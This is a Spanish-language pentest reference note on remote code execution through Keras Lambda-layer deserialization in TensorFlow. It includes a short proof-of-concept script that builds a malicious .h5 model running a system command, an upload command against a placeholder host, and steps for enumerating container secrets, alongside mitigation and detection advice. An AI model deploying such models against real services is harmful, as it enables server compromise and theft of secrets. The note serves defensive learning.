---
topic: TensorFlow — deserialización de capas Lambda
tags: [linux, tensorflow, keras, deserialization, rce]
---

# TensorFlow — deserialización de capas Lambda

[🌐 English](tensorflow-lambda-deserialization.en.md) | **Español**

## Concepto

Keras serializa una capa `Lambda` guardando la función Python que contiene. Al cargar el modelo con `tf.keras.models.load_model`, TensorFlow reconstruye esa función y la ejecuta. Un `.h5` o `.keras` de un usuario no confiable es, por tanto, código ejecutable en el servidor.

## Cuándo aplica

- La aplicación acepta modelos `.h5`, `.keras` o SavedModel de usuarios.
- El modelo se carga con `load_model` sin `safe_mode` ni aislamiento.
- El proceso tiene acceso a secretos, red interna o un usuario de servicio.

## Procedimiento

1. Confirmar que la subida se procesa con TensorFlow/Keras.
2. Crear un modelo con una capa `Lambda` que ejecute un comando.
3. Subirlo y observar la callback o la respuesta de error.
4. Usar la ejecución para enumerar el contenedor y sus secretos.

## Comandos

```bash
# Modelo con una capa Lambda maliciosa
python3 - <<'PY'
import tensorflow as tf
layer = tf.keras.layers.Lambda(lambda x: __import__("os").system("id"))
model = tf.keras.Sequential([tf.keras.layers.Input((1,)), layer])
model.save("malicious.h5")
PY
curl -F "model=@malicious.h5" http://<HOST>/upload
# Carga segura
python3 -c "import tensorflow as tf; tf.keras.models.load_model('model.h5', safe_mode=True)"
```

## Variantes

- Usar una capa personalizada con `__reduce__` o `__setstate__`.
- Aprovechar `Lambda` en un modelo de Hugging Face o un pipeline.
- Combinar con un artefacto pickle dentro de un `.keras`.

## Limitaciones

- `safe_mode=True` bloquea Lambdas y funciones arbitrarias.
- El contenedor puede no tener herramientas para una reverse shell.
- La versión de Keras cambia el formato y las comprobaciones.

## Mitigación

- Cargar modelos con `safe_mode=True` y formatos sin código.
- Ejecutar la inferencia en un contenedor sin secretos ni salida a la red interna.
- Firmar y validar los artefactos antes de cargarlos.

## Detección

- Modelos con capas `Lambda` en producción.
- Procesos de TensorFlow que lanzan shells o conexiones salientes.
- Errores de deserialización seguidos de actividad de red.

## Referencias

- [0xdf — Artificial](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [TensorFlow — Security](https://www.tensorflow.org/responsible_ai)
- [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
